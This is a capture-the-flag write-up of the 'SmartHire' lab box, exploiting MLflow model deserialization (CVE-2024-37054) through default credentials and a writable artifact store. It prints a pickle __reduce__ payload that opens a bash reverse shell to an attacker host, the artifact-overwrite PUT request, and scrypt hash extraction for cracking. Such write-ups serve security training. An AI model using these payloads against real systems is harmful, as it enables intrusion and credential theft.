# CTF – SmartHire (Writeup)

## Context
SmartHire is a Linux box running a Flask-style hiring application at `smarthire.htb`
that trains and serves ML models through an MLflow backend at `models.smarthire.htb`
(MLflow `3.12.0`). The app lets users upload CSVs to train a model and then run
predictions, and MLflow's artifact store is writable, which is the whole attack.

> Note: this box came with no `readme.txt`. The chain below is reconstructed from the
> exploit scripts (`shell.py`, `malicious_model.py`) and the sample data
> (`test.csv`, `admin.hash`, `smarthire.db`, `mlflow.db`). Privilege escalation to root
> is not covered by the artifacts, so this writeup stops at the foothold and loot.

## Recon
Two virtual hosts: the main app (`smarthire.htb`) and the MLflow tracking server
(`models.smarthire.htb`). The MLflow dashboard accepts the default credentials
`admin:password`. The app exposes `/register`, `/login`, `/upload_hiring_data`
(training) and `/predict` (inference).

## Initial access – MLflow deserialization RCE (CVE-2024-37054)
MLflow's `pyfunc` models are loaded by unpickling `python_model.pkl`. CVE-2024-37054
abuses this: if you can overwrite that artifact with a malicious pickle, MLflow runs
your code the moment the model is loaded for prediction. `shell.py` automates the
full chain:

1. **Register + log in** on `smarthire.htb` to get a `session` cookie (`--atoz`).
2. **Train a model** by uploading a clean CSV to `/upload_hiring_data`; the response
   returns the `registered_model` name.
3. **Resolve the `run_id`** from MLflow
   (`/ajax-api/2.0/mlflow/registered-models/search`, authed as `admin:password`).
4. **Build the malicious pickle** — a `__reduce__` that returns
   `(os.system, ("bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'",))`, serialized
   with `cloudpickle`.
5. **Overwrite the artifact** with an unauthenticated-to-the-app but MLflow-authed
   PUT:

   ```
   PUT /api/2.0/mlflow-artifacts/artifacts/0/<run_id>/artifacts/model/python_model.pkl
   ```

6. **Trigger `/predict`** on the app, uploading the same CSV, which loads the model
   and detonates the pickle.

```
python3 shell.py --lhost 10.10.17.176 --lport 4444 --atoz
```

`malicious_model.py` is the standalone helper that builds an equivalent poisoned
model directory (`mlflow.pyfunc.save_model` + a `python_model.pkl` overwritten with
the `os.system` reduce payload). The `MLmodel` / `conda.yaml` files confirm the target
stack: `cloudpickle 3.1.2`, `mlflow 3.12.0`, `python 3.14.5`.

The shell returned as the user running the model server.

## Loot – application database
`smarthire.db` holds the app's `users` table with scrypt password hashes. The `admin`
account's hash was extracted to `admin.hash` in a crackable format:

```
SCRYPT:32768:8:1:NzZPdVo2Q1oxaUlDd0NIcQ==:BxFI/2A/b7gIT3rV...
```

(The base64 salt `NzZPdVo2Q1oxaUlDd0NIcQ==` decodes to `76OuZ6CZ1iICwCHq`, matching the
`admin` row in `smarthire.db`.) These are `scrypt:32768:8:1` hashes — the standard
Werkzeug/Django parameters — suitable for offline cracking.

## Conclusion
A low-privileged app account was enough to register a model in MLflow. With MLflow's
default `admin:password` and a writable artifact store, I overwrote `python_model.pkl`
with a malicious cloudpickle and triggered `/predict`, achieving RCE via CVE-2024-37054.
The application database yielded the admin scrypt hash for cracking.

## Skills demonstrated
- Exploiting insecure ML model deserialization (MLflow CVE-2024-37054)
- Building `__reduce__` / cloudpickle RCE payloads
- Chaining app training flow with a writable MLflow artifact store
- Abusing default credentials on an internal service
- Extracting and formatting scrypt hashes from a SQLite app database
